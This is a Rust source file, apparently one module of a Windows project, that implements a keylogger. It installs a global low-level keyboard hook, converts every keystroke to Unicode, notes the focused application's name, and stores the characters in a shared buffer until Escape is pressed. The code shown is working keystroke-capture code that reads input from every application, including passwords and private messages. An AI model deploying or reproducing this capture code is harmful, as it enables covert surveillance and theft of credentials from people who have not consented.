use crate::formatting::{clear_current_line, initialize_header, update_status_header};
use crate::process_identification::{display_focused_process_name};
use crate::structs::GLOBAL_KEY_BUFFER;
use crossterm::cursor::{position, MoveTo};
use crossterm::ExecutableCommand;
use std::io::{stdout, Write};
use std::ptr;
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Console::{FlushConsoleInputBuffer, GetStdHandle, STD_INPUT_HANDLE};
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
use windows_sys::Win32::UI::Input::KeyboardAndMouse::{GetAsyncKeyState, GetKeyboardLayout, GetKeyboardState, ToUnicodeEx, VK_ESCAPE};
use windows_sys::Win32::UI::Input::KeyboardAndMouse::{VK_CAPITAL, VK_SHIFT};
use windows_sys::Win32::UI::WindowsAndMessaging::*;


pub static mut HOOK: HHOOK = ptr::null_mut();

pub unsafe extern "system" fn keyboard_procedure(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    unsafe {
        if n_code == HC_ACTION as i32 {
            if w_param == WM_KEYDOWN as usize ||
                w_param == WM_SYSKEYDOWN as usize {
                update_status_header("🧏 Listening").unwrap();
                if (*(l_param as *const KBDLLHOOKSTRUCT)).vkCode as u16 == VK_ESCAPE {
                    process_escape_key();
                    stdout().flush().unwrap()
                } else {
                    display_focused_process_name();
                    process_keyboard_input(l_param);
                }
            }
        }
        CallNextHookEx(HOOK, n_code, w_param, l_param)
    }
}

unsafe fn process_escape_key() {
    unsafe {
        let potential_error: BOOL = UnhookWindowsHookEx(HOOK);
        if potential_error == 0 {
            eprintln!("Failed to uninstall keyboard hook");
            eprintln!("Error code: {}", potential_error);
        }
        // necessary because otherwise the buffered input from the user will spill into the command line input.
        FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
        
        println!("\nHook has been uninstalled and keylogger has stopped.");
        PostQuitMessage(0); // Used to break message loop
    }
}

unsafe fn process_keyboard_input(l_param: LPARAM) {
    unsafe {
        let mut unicode_buffer: [u16; 8] = [0; 8];
        let mut keyboard_array: [u8; 256] = [0; 256];
        GetKeyboardState(keyboard_array.as_mut_ptr());
        
        // Check Shift and Caps Lock states
        if (GetAsyncKeyState(VK_SHIFT as i32) & 0x8000u16 as i16) != 0 {
            // Change if the shift key is pressed
            keyboard_array[VK_SHIFT as usize] |= 0x80;
        }
        if (GetAsyncKeyState(VK_CAPITAL as i32) & 0x0001) != 0 {
            keyboard_array[VK_CAPITAL as usize] |= 0x01;
        }

        let key_pressed_struct = *(l_param as *const KBDLLHOOKSTRUCT);
        let layout = GetKeyboardLayout(0);
        let count = ToUnicodeEx(key_pressed_struct.vkCode, key_pressed_struct.scanCode, keyboard_array.as_ptr(), unicode_buffer.as_mut_ptr(), unicode_buffer.len() as i32, 0, layout);
        let chars = &unicode_buffer[0..count as usize];
        
        log_keyboard_input(chars);
    }
}

fn log_keyboard_input(chars: &[u16]) {
    // Clear line and move cursor to the beginning
    clear_current_line().unwrap();
    if let Ok((_, row)) = position() {
        stdout().execute(MoveTo(0, row)).unwrap();
    }
    
    // Push characters to the global key buffer
    GLOBAL_KEY_BUFFER.lock().unwrap().push_chars(chars).unwrap_or_else(|e| {
        eprintln!("Failed to push characters to buffer: {}", e);
    });
    
    update_status_header("💾 Saved Buffer").unwrap();
    stdout().flush().unwrap();
}


pub fn run_keylogger() {
    unsafe {
        HOOK = SetWindowsHookExW(
            WH_KEYBOARD_LL,
            Some(keyboard_procedure),
            GetModuleHandleW(ptr::null()),
            0,
        );

        if HOOK.is_null() { // if the hook handle is null, we didn't install the hook.
            eprintln!("Failed to install keyboard hook");
            return;
        }

        initialize_header().unwrap_or_else(|e| {
            eprintln!("Failed to initialize header: {}", e);
        });

        let mut msg = std::mem::zeroed::<MSG>(); // Zero MSG struct to receive new message information
        // It is critical to not mess with this code as it could cause critical errors
        // to the application
        while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }
}
